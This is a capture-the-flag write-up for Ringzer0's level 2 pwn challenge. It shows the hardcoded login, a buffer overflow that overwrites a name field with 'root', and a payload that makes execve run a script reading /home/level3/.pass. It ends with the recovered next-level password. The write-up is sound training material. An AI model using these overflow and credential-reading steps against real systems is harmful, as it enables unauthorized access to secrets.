# Level 2 Ringzer0 Pwn challenges


From the code we can see that it requires  a username and password to bypass the first authentication
That we need to do compulsorily so let's get started with that
```text
level2@lxc-pwn-x86:/levels$ python -c 'print "nobody\nKsdkjkk32avsh\n"'| ./level2
Username: Password: Command: Okay Mr. nobody. Dropping priviledges though.
```
Now that we are authenticating, and we know there is a buffer overflow, let's find the offset

```text
level2@lxc-pwn-x86:/levels$ python -c 'print "nobody\nKsdkjkk32avsh\n" + "A"*100' | ./level2
Username: Password: Command: Okay Mr. AAAA. Dropping priviledges though.
```
At offset 100 we are overwriting the name of Mr. Nobody. We need to pass root here though in order to do command exec so let's get on with that.

```text
level2@lxc-pwn-x86:/levels$ python -c 'print "nobody\nKsdkjkk32avsh\n" + "A"*96+"root"' | ./level2
Username: Password: Command: Good job!
```
Great! Now we just have to write the command!

Since we are calling an execve(), we can't really pass anything. The /bin/bash and all the obvious payloads aren't passing through. After some nudges, I came accross an article saying you can execve the contents of a file to run a script
So I made a new folder in tmp, and came accross a new problem while trying to write a script: no new line and no shabang is possible in echo
After some time spent on stackoverflow, I was able to write the script
```text
level2@lxc-pwn-x86:/levels$ cat << EOF > /tmp/hdd2666/passwd.sh
> #!/bin/bash
> cat /home/level3/.pass
> echo "Done!"
> 
> EOF
level2@lxc-pwn-x86:/levels$ cat /tmp/hdd2666/passwd.sh
#!/bin/bash
cat /home/level3/.pass
echo "Done!"
```
Brilliant! Now all I have to do is 
```text
chmod +x /tmp/hdd2666/passwd.sh
```

And now send the payload!
```text
level2@lxc-pwn-x86:/levels$ python -c 'print "nobody\nKsdkjkk32avsh\n" + "/tmp/hdd2666/passwd.sh\x00" + "A"*73+"root\x00"' | ./level2
Username: Password: Command: Good job!
b130hOOfGftXUfmRZlgD
Done!
```

GG bois, the password to the next level is 
```text
b130hOOfGftXUfmRZlgD
```

